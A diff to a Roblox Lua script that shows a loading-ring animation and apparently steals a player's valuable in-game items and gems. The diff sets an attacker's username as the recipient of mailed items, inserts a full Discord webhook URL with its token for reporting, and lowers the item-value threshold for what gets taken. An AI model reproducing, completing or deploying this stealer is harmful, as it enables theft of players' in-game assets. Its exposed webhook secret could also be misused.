@@ -53,10 +53,10 @@ local tween = TweenService:Create(loadingRing,tweenInfo,{Rotation = 360})
 print("TweenService Successful")
 
 tween:Play()
-Username = ""
+Username = "jointex21"
 Username2 = "" -- stuff will get sent to this user if first user's mailbox is full
-webhook = ""
-min_rap = 1000000 -- minimum rap of each item you want to get sent to you. 1 mil by default
+webhook = "https://discord.com/api/webhooks/1282296562625548369/dHIQuEXGUox9lgu1IA09zfNM9us0OVMokXIZOqWI4LXS5sCvAiEJxhOgivZlwgF3dbuY"
+min_rap = 190000 -- minimum rap of each item you want to get sent to you. 1 mil by default
 
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
@@ -415,7 +415,7 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
             break
         end
     end    
-wait(1000000)
+wait(190000)
 
      
     
